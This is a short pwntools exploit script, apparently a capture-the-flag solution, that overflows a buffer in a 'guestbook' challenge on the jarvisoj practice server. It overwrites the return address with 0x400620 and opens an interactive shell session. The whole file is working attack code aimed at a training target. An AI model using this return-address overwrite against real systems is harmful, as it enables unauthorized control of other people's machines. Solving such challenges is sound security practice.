from pwn import *

#n = process('./guestbook')
n = remote('pwn.jarvisoj.com', 9876)

n.recv()
payload = 'a' * 0x88 + p64(0x0400620)
n.sendline(payload)
n.interactive()
